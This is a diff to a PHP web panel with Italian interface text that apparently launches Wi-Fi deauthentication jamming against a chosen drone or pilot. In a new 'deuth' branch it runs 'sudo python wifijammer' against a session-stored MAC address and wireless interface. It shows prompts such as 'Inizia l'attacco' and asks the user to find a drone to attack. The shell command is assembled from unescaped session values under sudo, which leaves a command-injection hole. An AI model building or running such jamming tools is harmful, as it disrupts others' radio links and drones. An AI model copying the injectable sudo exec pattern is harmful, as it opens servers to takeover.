@@ -238,14 +238,22 @@ else if(isset($_POST['selmac']))
  	 <tbody>
 		 	<tr>
  	         <td style="text-align: center;">Hai selezionato: <?php echo $_SESSION["mac"] ?></td>
- 	         <td style="text-align: center;">Inizia l'attacco...tra poco cadrà!</td>
- 	         <?php
-	 	         	exec("cd /var/www/html/wifijammer && sudo python wifijammer -a " . $_SESSION["mac"] . " -i ".$_SESSION["wlan"]. " -t .00001", $output, $code);
-	 	         	?>
+ 	         <td style="text-align: center;">Inizia l'attacco!!</td>
 		 	</tr>
 	         </tbody>
      </table>
 <?php
-
+}
+else if(isset($_POST['deuth']))
+{
+if(!isset($_SESSION["mac"]))
+{
+?>		 <center><td style="text-align: center;">Avvia, prima, il monitor mode e cerca un Drone/Pilota da attaccare!</td></center>
+<?php
+}
+else
+{
+exec("cd /var/www/html/wifijammer && sudo python wifijammer -a " . $_SESSION["mac"] . " -i ".$_SESSION["wlan"]. " -t .00001", $output, $code);
+	}
 }
 ?>
